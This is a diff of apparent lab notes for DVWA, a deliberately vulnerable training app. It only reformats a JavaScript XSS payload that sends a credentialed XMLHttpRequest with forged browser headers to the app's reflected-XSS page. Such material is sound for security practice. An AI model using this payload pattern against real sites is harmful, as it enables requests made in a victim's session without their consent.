@@ -126,9 +126,11 @@ Http request with minimum header paramaters in JavaScript:
 Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:
 	<script>var xhr=new XMLHttpRequest();
 		xhr.open('GET','http://dvwa.local/vulnerabilities/xss_r/?name=XSS');
-		xhr.withCredentials=true;xhr.setRequestHeader('Host',' dvwa.local');xhr.setRequestHeader('User-Agent',' Mozilla/5.0 Gecko/20100101 Firefox/114.0');
+		xhr.withCredentials=true;xhr.setRequestHeader('Host',' dvwa.local');
+		xhr.setRequestHeader('User-Agent',' Mozilla/5.0 Gecko/20100101 Firefox/114.0');
 		xhr.setRequestHeader('Accept',' text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8');
-		xhr.setRequestHeader('Accept-Language',' en-GB,en;q=0.5');xhr.setRequestHeader('Accept-Encoding',' gzip, deflate');
+		xhr.setRequestHeader('Accept-Language',' en-GB,en;q=0.5');
+		xhr.setRequestHeader('Accept-Encoding',' gzip, deflate');
 		xhr.setRequestHeader('Connection',' close');
 		xhr.setRequestHeader('Referer',' http://dvwa.local/vulnerabilities/xss_r/');
 		xhr.setRequestHeader('Upgrade-Insecure-Requests',' 1');
